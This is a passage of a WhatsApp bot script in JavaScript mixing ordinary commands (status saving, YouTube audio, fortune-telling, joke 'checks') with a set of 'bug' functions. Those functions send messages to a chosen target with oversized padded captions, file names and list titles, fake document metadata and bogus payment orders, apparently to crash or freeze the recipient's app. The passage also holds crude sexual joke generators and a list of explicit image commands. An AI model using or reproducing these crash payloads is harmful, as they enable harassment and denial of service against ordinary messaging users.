"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./anitav3.jpg`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./anitav3.jpg`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍★—°DAVID_CYRIL♡°༄• •━━✦✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}







try {
const textLower = m.text.toLowerCase();
if (textLower === 'save' || textLower === 'status' || 
textLower === 'please send me this video' || 
textLower === 'send video' ||
 textLower === 'pls send' ||
 textLower === 'please send' || 
textLower === 'save' || textLower === 'send') {
 const quotedMessage = m.msg.contextInfo.quotedMessage;
 if (quotedMessage) {
 if (quotedMessage.imageMessage) {
let imageCaption = quotedMessage.imageMessage.caption;
let imageUrl = await ptz.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
ptz.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
reply('*Downloading status...*');
 }
 if (quotedMessage.videoMessage) {
let videoCaption = quotedMessage.videoMessage.caption;
let videoUrl = await ptz.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
ptz.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
reply('`*Downloading status...*`');
 }
 }
}
} catch (error) {
console.error("`Error, Please Try Again Later`", error);
} 
    
const ryobug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `✳️᜴࿆͆᷍★—°DAVID_CYRIL♡°༄• •━━✦✅⃟╮`
}
}
} 

  
async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await ptz.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍★—°DAVID_CYRIL♡°༄• •━━✦✅⃟╮`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await ptz.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await ptz.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "⟠ 𝐙͢𝐱𝐕 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々"+" ".repeat(920000),
        'footerText': `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
        'description': `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: ryobug });
await ptz.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "✳️᜴࿆͆᷍★—°DAVID_CYRIL♡°༄• •━━✦✅⃟╮",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://i.ibb.co/Wppj16p/cheemspic.jpg" } }, { upload: ptz.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #✳️᜴࿆͆᷍★—°DAVID_CYRIL♡°༄• •━━✦✅⃟╮"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await ptz.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
async function aipong(target) {
await ptz.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
    
async function downloadMp3(url) {
try {
// jalur sampah
let mp3File = './tmp/'+getRandom('.mp3')
ytdl(url, {filter: 'audioonly'}).pipe(fs.createWriteStream(mp3File)).on('finish', async() => {
await ptz.sendMessage(from, {audio: fs.readFileSync(mp3File), mimetype: 'audio/mpeg'}, {quoted:m})
fs.unlinkSync(mp3File)
})
} catch(e) {
console.log(e)
return console.log(util.format(e))
}
}
let userLevels = {};
let userXP = {};

// Load and Save Levels and XP
const levelsPath = './Rpg/Levels.json';
const xpPath = './Rpg/XP.json';

userLevels = loadData(levelsPath, {});
userXP = loadData(xpPath, {});

const saveLevels = () => {
    saveData(levelsPath, userLevels);
};

const saveXP = () => {
    saveData(xpPath, userXP);
};


const addXP = (userId, xp, m) => {
    if (!userXP[userId]) {
        userXP[userId] = 0;
        userLevels[userId] = 1;
    }

    userXP[userId] += xp;

    while (userXP[userId] >= userLevels[userId] * 100) {
        userXP[userId] -= userLevels[userId] * 100;
        userLevels[userId] += 1;
        reply(`Congratulations! Your Digimon leveled up to Level ${userLevels[userId]}!`);
    }

    saveXP();
    saveLevels();
};

// status digimon mu
const showLevel = (userId, m) => {
    if (!userLevels[userId]) {
        return reply("You have no levels or digimon.");
    }

    const level = userLevels[userId];
    const xp = userXP[userId];
    return reply(`*${m2}[ ${userDigimons[userId]} ]${m2}*\n\n Your Digimon is Level ${level} with ${xp}/${level * 100} XP.`);
};
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}
    
switch(command) {
/* ############ Add Case By Reivaldo David Cyrilo ############### */


    case 'genshin':
    case 'swimsuit':
    case 'schoolswimsuit':
    case 'white':
    case 'barefoot':
    case 'touhou':
    case 'gamecg':
    case 'hololive':
    case 'uncensored':
    case 'sungglasses':
    case 'glasses':
    case 'weapon':
    case 'shirtlift':
    case 'chain':
    case 'fingering':
    case 'flatchest':
    case 'torncloth':
    case 'bondage':
    case 'demon':
    case 'pantypull':
    case 'headdress':
    case 'headphone':
    case 'anusview':
    case 'shorts':
    case 'stokings':
    case 'topless':
    case 'beach':
    case 'bunnygirl':
    case 'bunnyear':
    case 'vampire':
    case 'nobra':
    case 'bikini':
    case 'whitehair':
    case 'blonde':
    case 'pinkhair':
    case 'bed':
    case 'ponytail':
    case 'nude':
    case 'dress':
    case 'underwear':
    case 'foxgirl':
    case 'uniform':
    case 'skirt':
    case 'breast':
    case 'twintail':
    case 'spreadpussy':
    case 'seethrough':
    case 'breasthold':
    case 'fateseries':
    case 'spreadlegs':
    case 'openshirt':
    case 'headband':
    case 'nipples':
    case 'erectnipples':
    case 'greenhair':
    case 'wolfgirl':
    case 'catgirl':
  let res = await fetch(`https://fantox-apis.vercel.app/${command}`)
  if (!res.ok) throw await res.text()
  let jsonx = await res.json()
  if (!jsonx.url) throw 'Error'
  ptz.sendFile(m.chat, jsonx.url, 'img.jpg', `Here you go!`, m)
  break


          

case "mydigi": case "my-digimon":
        showLevel(m.sender, m)
        break
        
        case 'bisakah':{

const bisakah = text
const bisa =['CAN','Oh of course you can','He always do like that bro 😂˜„','Oh of Course you can','Of Course you can but im sorry','No, he cant','No way','I cant answer 😆™‚‚','Its a secret','Repeat Tod, I dont understand','Where I know fig']
const keh = bisa[Math.floor(Math.random() * bisa.length)]
ptz.sendMessage(from, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `- Primbo Feature -`,previewType:"PHOTO",thumbnail: its,sourceUrl: `https://whatsapp.com/channel/0029VaeRru3ADTOEKPCPom0L`,}
}, text: '*Pertanyaan : '+bisakah+'*\n\n*Jawaban :* '+ keh }, { quoted: m })
}
break
case 'gimana':
case 'gimanadong':
case 'bagaimanakah':{

const bagaimanakah = text
const bagai =['Do We Know Each Other?','Keep Asking','Dont Know','Can I Slap You?','Just Find Out Yourself','Dont Know','How Would I Know, Im a Fish','Huh, you ask me and then who should I ask','Whahahaha I dont know 😑']
const mana = bagai[Math.floor(Math.random() * bagai.length)]
ptz.sendMessage(from, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `- Check And Check -ㅤㅤㅤㅤㅤㅤㅤㅤㅤ`,body:`⌜ ${ucapanWaktu} ⌟`,previewType:"PHOTO",thumbnail: its,sourceUrl: `https://whatsapp.com/channel/0029VaeRru3ADTOEKPCPom0L`,}
}, text: '*Pertanyaan : '+bagaimanakah+'*\n\n*Jawaban :* '+ mana}, { quoted: m })
}
break
case 'apakah':{

const apakah = text
const apa =['yes of course that','No','Oh of course not','Well how would I know why ask me','Its a secret','No need to ask, hes already like that','Oh ah I would better take a shower','Im pooping in a minute','Why do you like him?','Haha how could it be 👻']
const kah = apa[Math.floor(Math.random() * apa.length)]
ptz.sendMessage(from, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `- Check And Check -ㅤㅤㅤㅤㅤㅤㅤㅤㅤ`,body:`⌜ ${ucapanWaktu} ⌟`,previewType:"PHOTO",thumbnail: its,sourceUrl: `wa.me/2347043759577`,}
}, text: '*Pertanyaan : '+apakah+'*\n\n*Jawaban :* '+ kah}, { quoted: m })
}
break


  case 'ytmp3': {
  if (!text) return reply('Please provide a YouTube link.');

  try {
    // React with a musical note emoji
    await ptz.sendMessage(m?.chat, { react: { text: '🎵', key: m?.key } });

    // Fetch data from the API
    let response = await fetch(`https://api.agatz.xyz/api/ytplay?message=${text}`);
    let data = await response.json();

    // Check if the API returned a valid status
    if (data.status === 200 && data.data && data.data.url && data.data.url.url) {
      let audioUrl = data.data.url.url;
      let thumbnailUrl = data.data.thumb;
      let title = data.data.title;

      // Send thumbnail with caption
      await ptz.sendMessage(m.chat, { 
        image: { url: thumbnailUrl },  
        caption: `Title: ${title}\n *Audio Processing...*` 
      }, { quoted: m });

      // Send the audio file
      await ptz.sendMessage(m.chat, { 
        audio: { url: audioUrl }, 
        mimetype: 'audio/mp4', 
      }, { quoted: m });

    } else {
      // Handle API errors or missing audio URL
      reply('Error! Could not retrieve audio URL.');
    }
  } catch (error) {
    // Log any errors for debugging
    console.error(error);
    reply('Error! Something went wrong while processing your request.');
  }
}
break;



case 'kapankah':{

const kapankah = text
const kapan =['Tomorrow','The day after tomorrow','1 more day','2 more days','3 more days','4 more days','5 more days','6 more days','1 more month',' 2 Months More','3 Months More','4 Months More','5 Months More','6 Months More','7 Months More','8 Months More','9 Months More','10 Months More','11 Months More','1 Year More','2 Years More','3 Years More','4 Years More','5 Years More','6 Years More','7 Years More' ,'8 years to go','9 years to go','10 years to go']
const koh = kapan[Math.floor(Math.random() * kapan.length)]
ptz.sendMessage(from, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `- Check And Check -ㅤㅤㅤㅤㅤㅤㅤㅤㅤ`,body:`⌜ ${ucapanWaktu} ⌟`,previewType:"PHOTO",thumbnail: its,sourceUrl: `https://whatsapp.com/channel/0029VaeRru3ADTOEKPCPom0L`,}
}, text: '*Pertanyaan : '+kapankah+'*\n\n*Jawaban :* '+ koh}, { quoted: m })
}
break
    case 'watakcek': case 'cekwatak':
const watak = text
const wa =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Baperan','Kind-hearted','Patient','UwU','Top deh, basically','Likes to Help']
const tak = wa[Math.floor(Math.random() * wa.length)]
ptz.sendMessage(from, { text: 'Question : *'+watak+'*\n\nAnswer : '+ tak}, { quoted: m })
break				
    case 'hobbycek': case 'cekhobby':
const hobby = text
const hob =['Cooking','Helping Grandpa','Mabar','Nobar','Sosmedtan','Helping Others','Watching Anime','Watching Korean Drama','Riding a Motorcycle','Singing','Dancing','Colliding','Drawing','Taking Unclear Photos','Playing Games','Talking to Myself']
const by = hob[Math.floor(Math.random() * hob.length)]
ptz.sendMessage(from, { text: 'Question : *'+hobby+'*\n\nAnswer : '+ by}, { quoted: m })
break
case 'cebelapaimutciaku': case 'seberapaimutsiaku':{

const edgar = text
const nanya =['*79%*\n\nLoh Kawai is so cute><','*15%*\n\nYour mom says you are cute:v🗿','*30%*\n\nWhy are you asking me?\nMinimum Bath🗿','*28%*\n\nYes, the cutest one;)','*100%*\n\nPap the cute one first:v😘']
const pret = nanya[Math.floor(Math.random() * nanya.length)]
ptz.sendMessage(from, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `- Check And Check -`,body:`⌜ ${ucapanWaktu} ⌟`,previewType:"PHOTO",thumbnail: its,sourceUrl: `https://whatsapp.com/channel/0029VaeRru3ADTOEKPCPom0L`,}
}, text: '*Pertanyaan : '+edgar+'*\n\n*Jawaban :* '+ pret}, { quoted: m })
}
break
    case 'cekmemek':
			case 'cekmeki':
				 
if (!q) return reply('tag temanmu!')
				const persengayy = text
          const gay = ["*Already Not a Virgin:v*\n• Item Color🙈\n• Thick Hair\n• He Said It's Plain Ko Five Fingers Escaped Chuackk","*Still Virgin*\n• Color Pink🤤\n• No Hair\n• Wow this is just for my owner😋","*Bjir Bau 😵‍💫*\n\n• Brother Colmek\n• Very Thick:v\n• Ishh That Genie's Nest😵","*Still a Virgin*\n• Color White Dead\n• Still Innocent\n• Looks Like You Need Ktetotgatan From My Owner🥸 ","*Meki semu Chocolate*\n • Rape Victim 😑\n• Lu Sih Play Ma Group Cowo Sengklek\n• Jan Should Be Too Rash 🤧 ","*Normal As Usual*\n• Wuanjay Ko Bulu Kryput 🙈\n• Turns Out Oh Turns Out You Like Lesbians🫤","*Danger Noh Gan*\n• Got A Virus\n• If Wik Wik Ntar Ke Patil The Guy\n😶‍🌫️Afraid Of My Genital Pus ntarr😬","*Lah Ireng Amat bjirr*\n• Hearts Are Like Real People\n• Don't He Serve Even Animal Men🫣","*74%*\n * God bless David Cyril🏃🌬️*"]
				const kl = gay[Math.floor(Math.random() * gay.length)]
    ptz.sendMessage(from, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `- Check And Check -ㅤㅤㅤㅤㅤㅤㅤㅤㅤ`,body:`⌜ ${ucapanWaktu} ⌟`,previewType:"PHOTO",thumbnail: its,sourceUrl: `https://whatsapp.com/channel/0029VaeRru3ADTOEKPCPom0L`,}
}, text :'Results Dari: *'+persengayy+'*\n\nJawaban : '+kl}, { quoted: m })
				break  

			case 'cekkontol':
				
if (!q) return reply('Mana Name?')
				
	const persenbucin = text
    const bucin =
          ["Hadehh🤦\n[ The Item Smells Again ishh 🤮 ]","9%\n\nIt's Still Small, It's Closed, But Its Feathers Are Comt🗿 Ae","Nakk Still Small","28%\n\nYoalahh hmm"," 34%\n\nMayan Lah","48%\n\nGatau","59%\n\nIt's normal Kang Coli Mah Tityd nya Item🗿","apacoba\nKasian Mana Masih Muda","what's the tityd of eggplant", "Oh my God"]
				const tetot = bucin[Math.floor(Math.random() * bucin.length)]
    ptz.sendMessage(from, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `- Check And Check -ㅤㅤㅤㅤㅤㅤㅤㅤㅤ`,body:`⌜ ${ucapanWaktu} ⌟`,previewType:"PHOTO",thumbnail: its,sourceUrl: `https://whatsapp.com/channel/0029VaeRru3ADTOEKPCPom0L`,}
}, 
text : 'cekkomtlo🗿: *'+persenbucin+'*\n\nJawaban : '+ tetot}, { quoted: m })
				break 

  case 'cekme':{

let ppimg = await ptz.profilePictureUrl(sender, 'image').catch(_ => 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg')
const sifat =['Baek','Jutek','Ngeselin','Bobrok','Pemarah','Sopan','Beban','Sangean','Cringe','Pembohong']
const hoby =['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
const bukcin =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const arp =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cakep =['Iyaa cakep','Maaf Kak, Banyak² Perawatan Ya','Jelek ajg','Cakep banget😍','❌','✔️']
const wetak=['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Baperan','Kind-hearted','Patient','UwU','Top deh, basically','Likes to Help']
const baikk =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const bhuruk =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cerdhas =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const berhani =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const mengheikan =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const suka = ['Makan','Tidur','Main Game','Sesama type','Binatang',`Seseorang Yang ${pushname} Sukai`,'Belajar','Ibadah','Diri Sendiri']
const sipat = sifat[Math.floor(Math.random() * sifat.length)]
const biho = hoby[Math.floor(Math.random() * hoby.length)]
const bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
const senga = arp[Math.floor(Math.random() * arp.length)]
const chakep = cakep[Math.floor(Math.random() * cakep.length)]
const watak = wetak[Math.floor(Math.random() * wetak.length)]
const baik = baikk[Math.floor(Math.random() * baikk.length)]
const burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
const cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
const berani = berhani[Math.floor(Math.random() * berhani.length)]
const takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
const gai = suka[Math.floor(Math.random() * suka.length)]

let its = await getBuffer (ppimg)
let teks = ` *${m2}[ PRIVATE CHECK ]${m2}* 

∘ *Name :*  ${pushname}
∘ *Nature :*  ${sipat}
∘ *Bucin :*  ${bhucin}%
∘ *Handsome :*  ${chakep}
∘ *Character :*  ${watak}
∘ *Hobby :*  ${biho}
∘ *Afraid :*  ${takut}%
∘ *Courage :*  ${berani}%
∘ *Intelligence :*  ${cerdas}%
∘ *Good Manners :*  ${baik}%
∘ *Bad manners :*  ${burug}%
∘ *Like :* ${gai} `
ptz.sendMessage(from, { contextInfo: { externalAdReply: {showAdAttribution: true,
title: `- Check And Check -ㅤㅤㅤㅤㅤㅤㅤㅤㅤ`,body:`⌜ ${ucapanWaktu} ⌟`,previewType:"PHOTO",thumbnail: its,sourceUrl: `https://whatsapp.com/channel/0029VaeRru3ADTOEKPCPom0L`,}
}, image: its, caption: teks}, { quoted: m })
}

break

 // ===================================== // primbon
  case 'artinama': {
if (!q) return reply( `Example : ${prefix + command} tetotz `)
let anu = await primbon.arti_nama(q)
if (anu.status == false) return reply(anu.message)
let teks = `
∘ *Name :* ${anu.message.nama}
∘ *No :* ${anu.message.arti}
∘ *Notes :* ${anu.message.catatan}`
reply(teks)
}
break	 
    
case 'artimimpi': case 'tafsirmimpi': {
if (!q) return reply( `Example : ${prefix + command} belanja`)
let anu = await primbon.tafsir_mimpi(q)
if (anu.status == false) return reply(anu.message)
let teks = `
• *Dream :* ${anu.message.mimpi}
• *Arti :* ${anu.message.arti}
• *Solution :* ${anu.message.solusi}`
reply(teks)
}
break
 case 'pasangan': {
if (!q) return reply( `Example : ${prefix + command} David|Anita`)
let [nama1, nama2] = q.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return reply(anu.message)
let teks = `
• *Your name :* ${anu.message.nama_anda}
• *Couple Name :* ${anu.message.nama_pasangan}
• *Positive Side :* ${anu.message.sisi_positif}
• *Negative Side :* ${anu.message.sisi_negatif}`
reply(teks)
}
break   
case 'ramalancinta': case 'ramalcinta': {
if (!q) return reply( `Example : ${prefix + command} David, 05, 8, 2005, anita, 16, 10, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
let teks = `
• *Your name :* ${anu.message.nama_anda.nama}
• *Your Birth :* ${anu.message.nama_anda.tgl_lahir}
• *Couple Name :* ${anu.message.nama_pasangan.nama}
• *Birth of a Couple :* ${anu.message.nama_pasangan.tgl_lahir}
• *Positive Side :* ${anu.message.sisi_positif}
• *Negative Side :* ${anu.message.sisi_negatif}
• *Catatan :*
${anu.message.catatan}`
reply(teks)
}
break   
case 'kecocokannama': 
case 'cocoknama': {
if (!q) return reply( `Example : ${prefix + command} david, 05, 8, 2005`)
let [nama, tgl, bln, thn] = q.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
let teks = `
• *No :* ${anu.message.nama}
• *Born :* ${anu.message.tgl_lahir}
• *Life Path :* ${anu.message.life_path}
• *Destiny :* ${anu.message.destiny}
• *Destiny Desire :* ${anu.message.destiny_desire}
• *Personality :* ${anu.message.personality}
• *Percentage :* ${anu.message.persentase_kecocokan}`
reply(teks)
}
break 
    case 'kecocokanpasangan':
case 'cocokpasangan':
case 'pasangan': {
if (!q) return reply( `Example : ${prefix + command} Dika|Novia`)
let [nama1, nama2] = q.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return reply(anu.message)
let teks = `
• *Your name :* ${anu.message.nama_anda}
• *Couple Name :* ${anu.message.nama_pasangan}
• *Positive Side :* ${anu.message.sisi_positif}
• *Negative Side :* ${anu.message.sisi_negatif}`
reply(teks)
}
break
case 'jadiannikah': {
if (!q) return reply( `Example : ${prefix + command} 6, 12, 2020`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
let teks = `
• *Wedding Date :* ${anu.message.tanggal}
• *characteristics :* ${anu.message.karakteristik}`
